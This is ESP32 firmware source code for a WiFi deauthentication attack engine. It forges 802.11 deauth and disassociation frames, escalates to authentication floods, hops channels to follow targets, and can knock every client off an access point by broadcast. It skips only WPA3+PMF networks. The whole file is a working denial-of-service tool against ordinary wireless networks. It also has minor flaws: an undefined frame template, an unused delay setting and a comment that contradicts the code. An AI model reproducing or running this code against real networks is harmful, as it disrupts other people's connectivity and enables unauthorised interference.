#include <stdatomic.h>
#include "deauth_engine.h"
#include "led_indicator.h"
#include "wifi_sniffer.h"
#include "esp_wifi.h"
#ifndef MACSTR
#define MACSTR "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC2STR(m) (m)[0],(m)[1],(m)[2],(m)[3],(m)[4],(m)[5]
#endif
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "wifi_tx_fix.h"

static const char *TAG = "deauth";
// ============================================================================
//  DEAUTH FALLBACK CHAIN DECISION
// ============================================================================
//  Branch A — Fixed 3-stage chain: deauth → disassoc → auth_flood
//    Decision: ACCEPTED. Deterministic progression; each stage has a
//    distinct failure mode and frame type.
//  Branch B — Random fallback with probability weighting
//    Decision: REJECTED. Unpredictable behavior; deterministic chain is
//    easier to reason about and debug in field conditions.
//  Branch C — Skip disassoc, go straight to auth_flood
//    Decision: REJECTED. Disassoc is lighter-weight and may succeed where
//    deauth is filtered; skipping it wastes a useful intermediate step.



static const uint8_t DEAUTH_TEMPLATE[] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

#define DEAUTH_FRAME_SIZE sizeof(DEAUTH_TEMPLATE)
#define DISASSOC_FRAME_SIZE 26
#define AUTH_FRAME_SIZE 30
#define DEAUTH_CH_SCAN_MS 250
#define DEAUTH_CH_SCAN_SLOTS 13
#define DEAUTH_FALLBACK_DISASSOC_LIMIT 40
#define DEAUTH_FALLBACK_AUTH_LIMIT 80

deauth_target_t g_deauth_targets[MAX_TARGET_APS];
int g_deauth_target_count = 0;
static atomic_bool g_deauth_active = ATOMIC_VAR_INIT(false);
static SemaphoreHandle_t g_deauth_lock = NULL;
static uint16_t g_deauth_seq = 0;

static bool deauth_target_is_protected(const uint8_t *bssid)
{
    bool pmf_req = false, wpa3 = false;
    if (!wifi_sniffer_get_security(bssid, &pmf_req, &wpa3)) return false;
    return pmf_req && wpa3;
}

static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid)
{
    if (dst == NULL || bssid == NULL) return;

    uint8_t frame[DISASSOC_FRAME_SIZE];
    memcpy(frame, DISASSOC_TEMPLATE, DISASSOC_FRAME_SIZE);
    memcpy(&frame[4], dst, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DISASSOC_FRAME_SIZE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "disassoc tx FAILED to " MACSTR ": %s", MAC2STR(dst), esp_err_to_name(ret));
    }
}

static void deauth_send_auth_flood(const uint8_t *bssid)
{
    if (bssid == NULL) return;

    uint8_t frame[AUTH_FRAME_SIZE];
    uint16_t seq = (uint16_t)(g_deauth_seq & 0xFFFF);
    for (int i = 0; i < 8; i++) {
        build_auth_frame(frame, bssid, bssid, (uint16_t)(seq + i));
        wifi_tx_safe(WIFI_IF_AP, frame, AUTH_FRAME_SIZE);
    }
    g_deauth_seq += 8;
}

static void deauth_send_frame(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid)
{
    if (dst == NULL || src == NULL || bssid == NULL) {
        return;
    }
    if (deauth_target_is_protected(bssid)) {
        ESP_LOGW(TAG, "skipping protected target " MACSTR " (WPA3+PMF)", MAC2STR(bssid));
        return;
    }

    uint8_t frame[DEAUTH_FRAME_SIZE];
    memcpy(frame, DEAUTH_TEMPLATE, DEAUTH_FRAME_SIZE);

    memcpy(&frame[4], dst, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);

    frame[22] = (uint8_t)(g_deauth_seq & 0xFF);
    frame[23] = (uint8_t)((g_deauth_seq >> 8) & 0xFF);
    g_deauth_seq++;

    esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DEAUTH_FRAME_SIZE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "deauth tx FAILED to %02X:%02X:%02X:%02X:%02X:%02X: %s",
                 dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
                 esp_err_to_name(ret));
    }
}

const char *deauth_fallback_level_name(deauth_fallback_t level)
{
    switch (level) {
        case DEAUTH_FALLBACK_NONE:        return "none";
        case DEAUTH_FALLBACK_DISASSOC:    return "disassoc";
        case DEAUTH_FALLBACK_AUTH_FLOOD:  return "auth_flood";
        default:                          return "unknown";
    }
}

bool deauth_has_escalated(const uint8_t *bssid)
{
    if (bssid == NULL || g_deauth_lock == NULL) return false;

    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    for (int i = 0; i < g_deauth_target_count; i++) {
        if (memcmp(g_deauth_targets[i].bssid, bssid, 6) == 0) {
            bool escalated = (g_deauth_targets[i].fallback_level != DEAUTH_FALLBACK_NONE);
            xSemaphoreGive(g_deauth_lock);
            return escalated;
        }
    }
    xSemaphoreGive(g_deauth_lock);
    return false;
}

static deauth_fallback_t deauth_get_fallback(const deauth_target_t *t)
{
    if (t == NULL) return DEAUTH_FALLBACK_NONE;

    if (t->fallback_level == DEAUTH_FALLBACK_DISASSOC &&
        t->disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
        return DEAUTH_FALLBACK_AUTH_FLOOD;
    }
    if (t->fallback_level == DEAUTH_FALLBACK_AUTH_FLOOD) {
        return DEAUTH_FALLBACK_AUTH_FLOOD;
    }
    return DEAUTH_FALLBACK_DISASSOC;
}

static void deauth_task(void *arg)
{
    watchdog_task_refresh("deauth_task");
    ESP_LOGI(TAG, "Deauth attack task started");

    while (atomic_load(&g_deauth_active)) {
        if (g_deauth_lock != NULL) {
            xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
        }

        for (int i = 0; i < g_deauth_target_count; i++) {
            if (!g_deauth_targets[i].active) {
                continue;
            }

            uint8_t target_channel = 0;
            wifi_sniffer_get_ap_bssid_and_channel_for_client(
                g_deauth_targets[i].bssid, NULL, &target_channel
            );
            if (target_channel == 0) {
                wifi_sniffer_get_channel_for_bssid(
                    g_deauth_targets[i].bssid, &target_channel
                );
            }
            if (target_channel > 0) {
                uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
                if (target_channel != fixed_ch) {
                    atomic_store(&g_wifi_fixed_channel, target_channel);
                    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
                    ESP_LOGI(TAG, "Switched to channel %d for deauth", target_channel);
                }
            }

            bool unlimited = (g_deauth_targets[i].count == 0);

            switch (g_deauth_targets[i].fallback_level) {
                case DEAUTH_FALLBACK_DISASSOC:
                case DEAUTH_FALLBACK_AUTH_FLOOD: {
                    deauth_fallback_t fb = deauth_get_fallback(&g_deauth_targets[i]);

                    if (fb == DEAUTH_FALLBACK_DISASSOC) {
                        uint8_t bcast[6];
                        memset(bcast, 0xFF, 6);
                        if (g_deauth_targets[i].client_mac[0] == 0xFF) {
                            /* Broadcast target: disassoc to broadcast */
                            deauth_send_disassoc(bcast,
                                                 g_deauth_targets[i].bssid);
                        } else {
                            deauth_send_disassoc(g_deauth_targets[i].client_mac,
                                                 g_deauth_targets[i].bssid);
                            deauth_send_disassoc(g_deauth_targets[i].bssid,
                                                 g_deauth_targets[i].client_mac);
                        }
                        g_deauth_targets[i].disassoc_count++;

                        if (g_deauth_targets[i].disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
                            g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_AUTH_FLOOD;
                            ESP_LOGI(TAG, "target " MACSTR " escalating to auth flood",
                                     MAC2STR(g_deauth_targets[i].bssid));
                        }
                    } else {
                        deauth_send_auth_flood(g_deauth_targets[i].bssid);
                        g_deauth_targets[i].auth_count++;
                    }

                    if (!unlimited) {
                        g_deauth_targets[i].count--;
                    }
                    break;
                }
                default: {
                    /* Primary deauth frames */
                    deauth_send_frame(
                        g_deauth_targets[i].client_mac,
                        g_deauth_targets[i].bssid,
                        g_deauth_targets[i].bssid
                    );
                    deauth_send_frame(
                        g_deauth_targets[i].bssid,
                        g_deauth_targets[i].client_mac,
                        g_deauth_targets[i].bssid
                    );

                    if (!unlimited) {
                        g_deauth_targets[i].count--;
                    }

                    /* If deauth target has no PMF guard and fallback enabled,
                     * escalate to disassoc after first pass to maximize chance
                     * of client eviction. */
                    if (!deauth_target_is_protected(g_deauth_targets[i].bssid) &&
                        g_deauth_targets[i].fallback_level == DEAUTH_FALLBACK_NONE) {
                        g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_DISASSOC;
                    }
                    break;
                }
            }
        }

        if (g_deauth_lock != NULL) {
            xSemaphoreGive(g_deauth_lock);
        }

        vTaskDelay(pdMS_TO_TICKS(50));  // Too fast; increase to 50ms below
    }

    ESP_LOGI(TAG, "Deauth attack task ended");
    vTaskDelete(NULL);
}

esp_err_t deauth_init(void)
{
    if (g_deauth_lock == NULL) {
        g_deauth_lock = xSemaphoreCreateMutex();
        if (g_deauth_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    ESP_LOGI(TAG, "Deauth module initialized");
    return ESP_OK;
}

esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uint32_t count, uint32_t delay_ms)
{
    if (bssid == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    esp_err_t ret = deauth_init();
    if (ret != ESP_OK) {
        return ret;
    }

    if (g_deauth_lock == NULL) {
        return ESP_ERR_NO_MEM;
    }

    if (xSemaphoreTake(g_deauth_lock, portMAX_DELAY) != pdTRUE) {
        return ESP_FAIL;
    }

    if (g_deauth_target_count >= MAX_TARGET_APS) {
        xSemaphoreGive(g_deauth_lock);
        return ESP_ERR_NO_MEM;
    }

    int idx = g_deauth_target_count;
    memcpy(g_deauth_targets[idx].bssid, bssid, 6);

    if (client_mac != NULL) {
        memcpy(g_deauth_targets[idx].client_mac, client_mac, 6);
        g_deauth_targets[idx].type = DEAUTH_TYPE_SINGLE;
    } else {
        memset(g_deauth_targets[idx].client_mac, 0xFF, 6);
        g_deauth_targets[idx].type = DEAUTH_TYPE_BROADCAST;
    }

    g_deauth_targets[idx].count = count;
    g_deauth_targets[idx].delay_ms = delay_ms;
    g_deauth_targets[idx].active = true;
    g_deauth_targets[idx].fallback_level = DEAUTH_FALLBACK_NONE;
    g_deauth_targets[idx].disassoc_count = 0;
    g_deauth_targets[idx].auth_count = 0;
    g_deauth_target_count++;

    xSemaphoreGive(g_deauth_lock);

    ESP_LOGI(
        TAG,
        "Deauth target added: BSSID %02X:%02X:%02X:%02X:%02X:%02X, count=%" PRIu32,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        count
    );

    return ESP_OK;
}

esp_err_t deauth_attack_ap_all_clients(const uint8_t *bssid, uint32_t count, uint32_t delay_ms)
{
    if (bssid == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    return deauth_add_target(bssid, NULL, count, delay_ms);
}

esp_err_t deauth_start(void)
{
    if (g_deauth_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    if (atomic_load(&g_deauth_active)) {
        return ESP_OK;
    }

    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    int target_count = g_deauth_target_count;
    xSemaphoreGive(g_deauth_lock);

    if (target_count == 0) {
        ESP_LOGW(TAG, "No deauth targets configured");
        return ESP_ERR_INVALID_STATE;
    }

    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_set_promiscuous failed: %s", esp_err_to_name(ret));
        return ret;
    }

    atomic_store(&g_deauth_active, true);
    g_deauth_seq = 0;

    led_set_state(LED_STATE_SCANNING);

    if (xTaskCreatePinnedToCore(deauth_task, "deauth_task", 3072, NULL, 5, NULL, 0) != pdPASS) {
        atomic_store(&g_deauth_active, false);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Deauth attack started with %d targets", target_count);
    return ESP_OK;
}

void deauth_stop(void)
{
    atomic_store(&g_deauth_active, false);
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "Deauth attack stopped");
}

bool deauth_is_active(void)
{
    return atomic_load(&g_deauth_active);
}

void deauth_remove_all(void)
{
    if (g_deauth_lock != NULL) {
        xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    }

    g_deauth_target_count = 0;
    memset(g_deauth_targets, 0, sizeof(g_deauth_targets));

    if (g_deauth_lock != NULL) {
        xSemaphoreGive(g_deauth_lock);
    }
}
